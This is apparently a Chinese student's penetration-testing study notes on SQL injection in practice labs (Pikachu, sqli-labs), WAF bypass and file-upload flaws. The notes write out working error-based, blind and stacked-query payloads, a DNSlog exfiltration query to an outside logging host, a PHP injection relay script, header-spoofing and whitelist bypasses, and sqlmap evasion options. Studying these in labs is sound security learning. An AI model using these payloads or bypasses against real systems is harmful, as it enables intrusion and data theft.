<h4 id="pikachu-insert"><a href="#pikachu-insert" class="headerlink" title="pikachu insert"></a>pikachu insert</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span></span><br><span class="line"><span class="operator">&amp;</span>password<span class="operator">=</span>xiaodi<span class="operator">&amp;</span>sex<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">94</span><span class="operator">%</span>B7<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">13878787788</span><span class="operator">&amp;</span>email<span class="operator">=</span>wuhan<span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>hubei<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><span class="operator">&amp;</span>password<span class="operator">=</span>xiaodi<span class="operator">&amp;</span>sex<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">94</span><span class="operator">%</span>B7<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">13878787788</span><span class="operator">&amp;</span>email<span class="operator">=</span>wuhan<span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>hubei<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><span class="operator">&amp;</span>password<span class="operator">=</span>xiaodi<span class="operator">&amp;</span>sex<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">94</span><span class="operator">%</span>B7<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">13878787788</span><span class="operator">&amp;</span>email<span class="operator">=</span>wuhan<span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>hubei<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pikachu-update"><a href="#pikachu-update" class="headerlink" title="pikachu update"></a>pikachu update</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sex<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">94</span><span class="operator">%</span>B7<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">13878787788</span><span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>hubeNicky<span class="string">&#x27; or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;</span><span class="operator">&amp;</span>email<span class="operator">=</span>wuhan<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br><span class="line"></span><br><span class="line">sex<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">94</span><span class="operator">%</span>B7<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">13878787788</span><span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>hubeNicky<span class="string">&#x27; or  updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><span class="operator">&amp;</span>email<span class="operator">=</span>wuhan<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br><span class="line"></span><br><span class="line">sex<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">94</span><span class="operator">%</span>B7<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">13878787788</span><span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>Nicky<span class="string">&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><span class="operator">&amp;</span>email<span class="operator">=</span>wuhan<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br></pre></td></tr></table></figure>

<h4 id="pikachu-delete"><a href="#pikachu-delete" class="headerlink" title="pikachu delete"></a>pikachu delete</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_del.php?id<span class="operator">=</span><span class="number">56</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">+</span><span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>)x<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>information_schema.character_sets<span class="operator">+</span><span class="keyword">group</span><span class="operator">+</span><span class="keyword">by</span><span class="operator">+</span>x)a)</span><br><span class="line"></span><br><span class="line">pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_del.php?id<span class="operator">=</span><span class="number">56</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span>updatexml<span class="operator">+</span>(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_del.php?id<span class="operator">=</span><span class="number">56</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()))</span><br></pre></td></tr></table></figure>

<h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h3 id="✧（报错盲注"><a href="#✧（报错盲注" class="headerlink" title="✧（报错盲注)"></a>✧（报错盲注)</h3><p> 各种查询方式注入测试</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822160744436.png" alt="image-20230822160744436"></p>
<h3 id="✧（布尔盲注）"><a href="#✧（布尔盲注）" class="headerlink" title="✧（布尔盲注）"></a>✧（布尔盲注）</h3><p> sqlilabs-less5注入测试</p>
<h3 id="✧-（延时盲注）"><a href="#✧-（延时盲注）" class="headerlink" title="✧ （延时盲注）"></a>✧ （延时盲注）</h3><p>sqlilabs-less2注入测试</p>
<h3 id="✧-（排序盲注）"><a href="#✧-（排序盲注）" class="headerlink" title="✧ （排序盲注）"></a>✧ （排序盲注）</h3><p>sqlilabs-less46注入测试</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822165957070.png" alt="image-20230822165957070"></p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1574126/1626419936252-16c8f6af-566a-4d0e-a7ae-98e85e1526e8.png?x-oss-process=image/resize,w_832,limit_0" alt="image.png"></p>
<h2 id="cookie-加解密注入（实际案例）"><a href="#cookie-加解密注入（实际案例）" class="headerlink" title="cookie&amp;加解密注入（实际案例）"></a>cookie&amp;加解密注入（实际案例）</h2><p>sqlilabs-less21</p>
<h2 id="post登陆框-二次注入（实际案例）"><a href="#post登陆框-二次注入（实际案例）" class="headerlink" title="post登陆框&amp;二次注入（实际案例）"></a>post登陆框&amp;二次注入（实际案例）</h2><p>sqlilabs-less24</p>
<h2 id="load-file-dnslog带外注入（实际案例）"><a href="#load-file-dnslog带外注入（实际案例）" class="headerlink" title="load_file&amp;dnslog带外注入（实际案例）"></a>load_file&amp;dnslog带外注入（实际案例）</h2><p>sqlilabs-less9</p>
<p>DNSlog:解决了盲注不能回显数据，效率低的问题</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/sqlilabs/less-2/?id=-1">http://127.0.0.1:8080/sqlilabs/less-2/?id=-1</a> and if((select load_file(concat(‘\\‘,(select version()),’.1t7i2f.ceye.io\abc’))),1,0)–+</p>
<p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ADOOO/DnslogSqlinj%EF%BC%8Cpython2%E5%8E%BB%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%BF%99%E6%AC%BE%E5%B7%A5%E5%85%B7%E5%8F%AA%E6%94%AF%E6%8C%81dnslog%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5">https://github.com/ADOOO/DnslogSqlinj，python2去运行，这款工具只支持dnslog带外注入</a></p>
<h2 id="注入演示脚本演示（实际案例）"><a href="#注入演示脚本演示（实际案例）" class="headerlink" title="注入演示脚本演示（实际案例）"></a>注入演示脚本演示（实际案例）</h2><p>py-DnslogSqlinj-dnslog</p>
<p>用脚本进行中转注入，然后再发送到指定地址上去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="variable">$url</span>=<span class="string">&#x27;http://xxxx/job_bystjb/yjs_byszjs.asp?id=&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;`</span><br><span class="line">`<span class="variable">$urls</span>=<span class="variable">$url</span>.<span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$urls</span>);`</span><br><span class="line">`<span class="keyword">echo</span> <span class="variable">$urls</span>;`</span><br><span class="line">`<span class="meta">?&gt;</span>`</span><br></pre></td></tr></table></figure>







<h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><p>Stacked injections(堆叠注入)从名词的含义就可以看到</p>
<p>应该是一堆 sql 语句(多条)一起执行。</p>
<p>而在真实的运用中也是这样的, 我们知道在 mysql 中, </p>
<p>主要是命令行中, 每一条语句结尾加; 表示语句结束。</p>
<p>这样我们就想到了是不是可以多句一起使用。</p>
<p>这个叫做 stacked  injection。</p>
<p>less-38</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230830151442541.png" alt="image-20230830151442541"></p>
<p>show databases;</p>
<p>show tabels;</p>
<p>select * from users;</p>
<p>堆叠查询防止在查询某表是空时，通过堆叠注入，进行插入数据，用户密码是自定义的，可以正常解密登录</p>
<h2 id="WAF绕过SQL注入"><a href="#WAF绕过SQL注入" class="headerlink" title="WAF绕过SQL注入"></a>WAF绕过SQL注入</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1574126/1626429506804-7d707028-15a8-4c38-970b-bd86887ed2bc.png" alt="image.png"></p>
<p>​	     </p>
<h3 id="注释符混用"><a href="#注释符混用" class="headerlink" title="注释符混用"></a>注释符混用</h3><p> &#x2F;**&#x2F;     contact  %0A</p>
<p>常见url编码  </p>
<p>20% 空格 </p>
<p>22% “  </p>
<p>27% ‘</p>
<p>0x7E ~</p>
<p>%23 #</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230830164053843.png" alt="image-20230830164053843"></p>
<p>id&#x3D;1 union&#x2F;<em>%00</em>&#x2F;%23a%0A&#x2F;<em>!&#x2F;</em>!select 1,2,3*&#x2F;;%23</p>
<p>等价于 </p>
<p>id&#x3D;1 union #a</p>
<p>select 1,2,3;#</p>
<h3 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h3><table>
<thead>
<tr>
<th><strong>Web服务器</strong></th>
<th><strong>参数获取函数</strong></th>
<th><strong>获取到的参数</strong></th>
</tr>
</thead>
<tbody><tr>
<td>PHP&#x2F;Apache</td>
<td>$_GET(“par”)</td>
<td>Last</td>
</tr>
<tr>
<td>JSP&#x2F;Tomcat</td>
<td>Request.getParameter(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Perl(CGI)&#x2F;Apache</td>
<td>Param(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Python&#x2F;Apache</td>
<td>getvalue(“par”)</td>
<td>All (List)</td>
</tr>
<tr>
<td>ASP&#x2F;IIS</td>
<td>Request.QueryString(“par”)</td>
<td>All (comma-delimited string)</td>
</tr>
</tbody></table>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/**&amp;id=-1%20union%20select%201,2,3%23*/</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/**&amp;id=-1 union select 1,2,3#*/</span></span><br></pre></td></tr></table></figure>

<p>安全狗检测到的：1&#x2F;<em><em><strong><strong>&amp;id&#x3D;-1 union select 1,2,3#</strong></strong></em>&#x2F;，以为&#x2F;</em>**&#x2F;里面是注释不执行</p>
<p>Apache检测到的：-1 union select 1,2,3#*&#x2F; 以后一个id值为准</p>
<p>&#x2F;*!   *&#x2F;</p>
<p>上面这个例子有给两个id赋值，由于是参数污染，加上服务器是PHP&#x2F;Apache,$_GET(“par”)只接收后面的东西</p>
<h2 id="BurpSuit设置代理"><a href="#BurpSuit设置代理" class="headerlink" title="BurpSuit设置代理"></a>BurpSuit设置代理</h2><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831091055461.png" alt="image-20230831091055461"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831091111842.png" alt="image-20230831091111842"></p>
<h3 id="3、白名单"><a href="#3、白名单" class="headerlink" title="3、白名单"></a>3、白名单</h3><h4 id="方式一：IP白名单"><a href="#方式一：IP白名单" class="headerlink" title="方式一：IP白名单"></a>方式一：IP白名单</h4><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p>
<p>测试方法：修改http的header来bypass waf</p>
<p>X-forwarded-for</p>
<p>X-remote-IP</p>
<p>X-originating-IP</p>
<p>x-remote-addr</p>
<p>X-Real-ip</p>
<p> 伪造成自己IP，自己访问自己。条件比较苛刻，从网络层接收IP这个方式不现实</p>
<h4 id="方式二：静态资源"><a href="#方式二：静态资源" class="headerlink" title="方式二：静态资源"></a>方式二：静态资源</h4><p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>
<p><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p>
<p><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p>
<p>备注：Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php 后面基本不识别</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831092423882.png" alt="image-20230831092423882"></p>
<p> 接收php后面的参数</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831092926921.png" alt="image-20230831092926921"></p>
<h4 id="方式三：url白名单"><a href="#方式三：url白名单" class="headerlink" title="方式三：url白名单"></a>方式三：url白名单</h4><p>为了防止误拦，部分waf内置默认的白名单列表，如</p>
<p>admin&#x2F;manager&#x2F;system等管理后台。</p>
<p>只要url中存在白名单的字符串，就作为白名单不进行检测。</p>
<p> <img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831093230850.png" alt="image-20230831093230850"></p>
<p>存在白名单前缀可能就不检测后面的东西</p>
<h4 id="常见的url构造姿势："><a href="#常见的url构造姿势：" class="headerlink" title="常见的url构造姿势："></a>常见的url构造姿势：</h4><p><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php/admin.php?id=1">http://10.9.9.201/sql.php/admin.php?id=1</a></p>
<p><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php?a=/manage/&b=../etc/passwd">http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd</a></p>
<p><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.asp?id=2">http://10.9.9.201/../../../manage/../sql.asp?id=2</a></p>
<p>waf通过&#x2F;manage&#x2F;“进行比较，只要uri中存在&#x2F;manage&#x2F;就作为白名单不进行检测，这样我们可以通过&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwd 绕过防御规则。</p>
<h4 id="方式四：爬虫白名单"><a href="#方式四：爬虫白名单" class="headerlink" title="方式四：爬虫白名单"></a>方式四：爬虫白名单</h4><p>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</p>
<p>1、 根据UserAgent  2、通过行为来判断</p>
<p>UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。</p>
<p>User Agent Switcher (Firefox 附加组件)，下载地址:</p>
<p><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/">https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/</a></p>
<p>msql&#x2F;<em>!50001 select</em> from test *&#x2F;;</p>
<p>超过这个50001这个版本sql就会被执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%23x%0aunion%23x%0Aselect%201,2,3 </span><br><span class="line">%20union%20/*!44509select*/%201,2,3</span><br><span class="line">%20/*!44509union*/%23x%0aselect%201,2,3</span><br><span class="line">id=1/**&amp;id=-1%20union%20select%201,2,3%23*/</span><br><span class="line">%20union%20all%23%0a%20select%201,2,3%23</span><br></pre></td></tr></table></figure>

<p> <a target="_blank" rel="noopener" href="https://www.aliyundrive.com/s/RhibH2q9xPf">https://www.aliyundrive.com/s/RhibH2q9xPf</a> </p>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GtPDHgsevYnGPawvGDzYUw">https://pan.baidu.com/s/1GtPDHgsevYnGPawvGDzYUw</a> </p>
<p>0xi0 </p>
<h3 id="python安装教程"><a href="#python安装教程" class="headerlink" title="python安装教程"></a>python安装教程</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv15766138?from=search&spm_id_from=333.337.0.0">https://www.bilibili.com/read/cv15766138?from=search&amp;spm_id_from=333.337.0.0</a></p>
<h3 id="python使用教程"><a href="#python使用教程" class="headerlink" title="python使用教程"></a>python使用教程</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48728769/article/details/121588938">https://blog.csdn.net/weixin_48728769/article/details/121588938</a></p>
<p>sqlmap怎么绕过waf</p>
<p>sqlmap tamper</p>
<p>safedog   </p>
<p>对脚本进行使用  python sqlmap -u “”  –tamper&#x3D;safedog</p>
<p>监听一下数据包  python sqlmap -u “”  –tamper&#x3D;safedog –prixy&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8888/">http://127.0.0.1:8888</a></p>
<p>抓取浏览器正常访问数据包与sqlmap注入采集数据包有什么不同</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831162959590.png" alt="image-20230831162959590"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831163028051.png" alt="image-20230831163028051"></p>
<p>发现只有User-Agent不同</p>
<p>python sqlmap -u “ “  –tamper&#x3D;safedog –prixy&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8888/">http://127.0.0.1:8888</a>  –random-agent</p>
<p>sqlmap被拦截了，用延迟和代理池，爬虫白名单</p>
<p>sqlmap user-agent ,设置爬虫白名单</p>
<p>python sqlmap -u “ “  –tamper&#x3D;safedog –prixy&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8888/">http://127.0.0.1:8888</a>  –user-agent&#x3D;” “</p>
<p>sqlmap –delay，设置延迟</p>
<p>python sqlmap -u “ “   –tamper&#x3D;safedog –prixy&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8888/">http://127.0.0.1:8888</a>  –user-agent&#x3D;” “ –delay 1</p>
<p>代理池不讲 </p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1574126/1626938152195-6da71cd8-32fd-4ae6-803f-9b2400a100c3.png?x-oss-process=image/resize,w_726,limit_0" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1574126/1626938162334-524b17a0-0c40-48b9-9662-fb1fc0c871f9.png"></p>
<h3 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h3><p>文件上传漏洞是指 Web 服务器允许用户将文件上传至其文件系统，但这些文件可能并没有经过充分的验证，如文件名称、类型、内容或大小等。</p>
<h2 id="文件上传漏洞有哪些危害"><a href="#文件上传漏洞有哪些危害" class="headerlink" title="文件上传漏洞有哪些危害?"></a>文件上传漏洞有哪些危害?</h2><p>果上传的文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。甚至攻击者可以直接上传一个 webshell 到服务器上 完全控制系统或致使系统瘫痪。比如上传后门文件，进而拿权限等等（一句话木马）</p>
<h2 id="文件上传漏洞如何查找及判断？"><a href="#文件上传漏洞如何查找及判断？" class="headerlink" title="文件上传漏洞如何查找及判断？"></a>文件上传漏洞如何查找及判断？</h2><p>黑盒：扫描常见的上传地址</p>
<p>通过网站的功能应用测试：如会员中心上传图像</p>
<p>进入网站的后台，找文件上传的更高的权限，后台权限!&#x3D;网站权限（后台拿WEBSHELL）</p>
<p>扫描、会员中心、后台系统、代码分析等等</p>
<p>白盒代码分析，去查找文件上传的功能，有源代码</p>
<h2 id="文件上传漏洞有哪些需要注意的地方？"><a href="#文件上传漏洞有哪些需要注意的地方？" class="headerlink" title="文件上传漏洞有哪些需要注意的地方？"></a>文件上传漏洞有哪些需要注意的地方？</h2><p>判断文件上传类型，编辑器还是第三方，或者是会员中心，通过网上去搜索来利用这个文件上传漏洞</p>
<h2 id="关于文件上传漏洞在实际应用中的说明"><a href="#关于文件上传漏洞在实际应用中的说明" class="headerlink" title="关于文件上传漏洞在实际应用中的说明?"></a>关于文件上传漏洞在实际应用中的说明?</h2><h2 id="✧-常规文件上传地址的获取说明"><a href="#✧-常规文件上传地址的获取说明" class="headerlink" title="✧ 常规文件上传地址的获取说明"></a>✧ 常规文件上传地址的获取说明</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10421405.html">https://www.cnblogs.com/backlion/p/10421405.html</a></p>
<p>比如vip账号的url(例：<a target="_blank" rel="noopener" href="https://www.easyicon.net/vip/)%EF%BC%8C%E5%86%8D%E7%94%A8%E9%93%B8%E5%89%91%E6%88%96%E8%80%85%E5%BE%A1%E5%89%91%E6%89%AB%E6%8F%8F%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84url(%E7%94%A8%E9%93%B8%E5%89%91%E5%8F%AF%E4%BB%A5%E6%89%AB%E5%87%BAhttps://www.easyicon.net/vip/kindeditor%EF%BC%8C%E8%AF%B4%E6%98%8E%E6%AD%A4url%E6%9C%89%E6%BC%8F%E6%B4%9E)">https://www.easyicon.net/vip/)，再用铸剑或者御剑扫描，可以得出漏洞的url(用铸剑可以扫出https://www.easyicon.net/vip/kindeditor，说明此url有漏洞)</a></p>
<p>怎么去找文件上传漏洞</p>
<p>inurl:upload.php</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831172133145.png" alt="image-20230831172133145"></p>
<p>可以通过目录扫描，针对网站搜索引擎（upload.php）</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230831172523223.png" alt="image-20230831172523223"></p>
<p>kindeditor显示有文件编辑器</p>
<h2 id="✧-不同格式下的文件类型后门测试"><a href="#✧-不同格式下的文件类型后门测试" class="headerlink" title="✧ 不同格式下的文件类型后门测试"></a>✧ 不同格式下的文件类型后门测试</h2><p>上传后门链接不上，图片格式，后门有后门代码，取决于网站脚本，由于是php代码，以一个图片格式执行php代码是不实际的。</p>
<h2 id="✧-配合解析漏洞下的文件类型后门测试"><a href="#✧-配合解析漏洞下的文件类型后门测试" class="headerlink" title="✧ 配合解析漏洞下的文件类型后门测试"></a>✧ 配合解析漏洞下的文件类型后门测试</h2><p>nigix解析漏洞</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905085136752.png" alt="image-20230905085136752"></p>
<p>上传图片，显示图片地址，如果有php代码，按道理会显示php执行结果</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905085308925.png" alt="image-20230905085308925"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905085402964.png" alt="image-20230905085402964"></p>
<p>上面写上1.php出现代码执行，按道理显示下面这种结果出来报错，因为有解析漏洞结果发现php代码执行了，还是要访问加上xxx.php，对方利用这个平台(liunx,nigix)出现这个漏洞，就可以利用这个漏洞获得网站后门</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905085419744.png" alt="image-20230905085419744"></p>
<p>99%不能上传脚本格式文件，允许一般就上传图片和音频</p>
<p>把脚本验证成脚本格式</p>
<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<h2 id="✧-本地文件上传漏洞靶场环境搭建测试"><a href="#✧-本地文件上传漏洞靶场环境搭建测试" class="headerlink" title="✧ 本地文件上传漏洞靶场环境搭建测试"></a>✧ 本地文件上传漏洞靶场环境搭建测试</h2><p>upload-labs靶场，直接下载拖到www文件夹就行</p>
<h2 id="✧-某CMS及CVE编号（cve-2018-2894）文件上传漏洞测试"><a href="#✧-某CMS及CVE编号（cve-2018-2894）文件上传漏洞测试" class="headerlink" title="✧ 某CMS及CVE编号（cve-2018-2894）文件上传漏洞测试"></a>✧ 某CMS及CVE编号（cve-2018-2894）文件上传漏洞测试</h2><p>自己搭建的网站<img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905095118982.png" alt="image-20230905095118982"></p>
<p>先登录会员中心，发现有文件上传操作，先抓包，文件上传发现没抓到发现是js，</p>
<p>点击保存出现数据包，发现很多加密信息，把png格式改成php,文件上传之后，正常返回一个正常访问地址，</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905095323595.png" alt="image-20230905095323595"></p>
<p>显示上传错误，如果没有返回地址，实际情况不知道有没有上传到哪了</p>
<p>反汇结果显示错误，点击上传，把格式改成php，还是没有路径的回显，正常出现报错，认为觉得上传失败，但是看代码发现有修改，说明确实上传成功，但是我们不知道有没有上传成功，所以这个很容易遇到漏洞有但是我们能不知道。</p>
<p>CMS–&gt;指纹</p>
<p>finecms漏洞，</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905100047839.png" alt="image-20230905100047839"></p>
<p>得到uid</p>
<p>分类的作用就是让我们拿到一个漏洞后，选择相应地办法去解决，而不是横冲直撞</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905101929603.png" alt="image-20230905101929603"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905101939235.png" alt="image-20230905101939235"></p>
<p>这个案例通过信息归类文件上传，本地文件测试不能知道文件存在也不知道返回地址</p>
<p>，通过归类网上查资料，得到漏洞的利用方法</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905102333587.png" alt="image-20230905102333587"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230905102505217.png" alt="image-20230905102505217"></p>
